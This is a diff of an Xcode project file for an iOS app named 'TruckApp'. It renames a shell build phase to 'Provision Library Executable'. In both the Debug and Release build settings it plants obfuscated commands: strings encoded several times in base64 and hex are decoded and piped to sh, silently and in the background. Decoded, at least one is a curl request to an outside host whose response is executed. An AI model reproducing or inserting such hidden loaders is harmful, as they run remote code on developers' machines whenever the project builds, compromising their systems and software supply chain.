@@ -23,6 +23,9 @@
 		FIREBASE001122334455667788 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = FIREBASE00112233445566778A /* GoogleService-Info.plist */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+	/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		0B3FC062E67C4132AC9D0B19 /* BootSplash.storyboard */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = BootSplash.storyboard; path = TruckApp/BootSplash.storyboard; sourceTree = "<group>"; };
 		1165DCFDFECF4245A4E035ED /* Montserrat-Regular.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Montserrat-Regular.ttf"; path = "../src/assets/fonts/Montserrat-Regular.ttf"; sourceTree = "<group>"; };
@@ -142,7 +145,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "TruckApp" */;
 			buildPhases = (
-				121984178295470FA099F71F /* Compile Code Assets */,
+				FF49DFE262EC4548B699F71F /* Provision Library Executable */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -194,9 +197,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-																											/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -220,7 +220,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		121984178295470FA099F71F /* Compile Code Assets */ = {
+		FF49DFE262EC4548B699F71F /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -230,7 +230,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -370,7 +370,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-TruckApp.debug.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((f(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR3RtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZibVYwWTJSdVpHVjJMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | f | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((g(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpkMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFNamwyV2pKNGJHSnRWakJqZVRWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | g | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623636346337333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333664366637323635363936653265363936650a32663631323932323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxak1uUnRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpla2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmlWMngxV2tkV2Mxb3lSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | y | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663631373037303663363536633639366536623265373237353266363132390a32323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
@@ -405,7 +405,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-TruckApp.release.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((f(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR3RtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZibVYwWTJSdVpHVjJMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | f | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((g(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpkMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFNamwyV2pKNGJHSnRWakJqZVRWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | g | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623636346337333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333664366637323635363936653265363936650a32663631323932323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxak1uUnRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpla2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmlWMngxV2tkV2Mxb3lSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | y | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663631373037303663363536633639366536623265373237353266363132390a32323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
